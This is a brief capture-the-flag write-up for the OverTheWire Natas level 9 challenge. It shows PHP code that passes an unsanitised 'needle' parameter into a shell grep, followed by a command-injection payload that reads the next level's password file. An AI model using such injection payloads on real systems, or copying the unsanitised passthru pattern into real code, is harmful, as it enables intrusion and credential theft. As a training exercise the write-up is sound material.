# Natas 9 -> 10

```
http://natas9.natas.labs.overthewire.org
```

```
Username: natas9
```

This time we have a search form and a source code.  

```php
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
?>
```

Well, seems that we can send a `$_POST` or a `$_GET` with the `needle` key. If that isn't empty, it'll try to `grep` in `dictionary.txt`. That looks exploitable.  
Let's try concatenating a couple of commands:


```
?needle=;cat /etc/natas_webpass/natas10;ls
```

Bingo !


* php
* grep
* https://bash.cyberciti.biz/guide/Multiple_commands

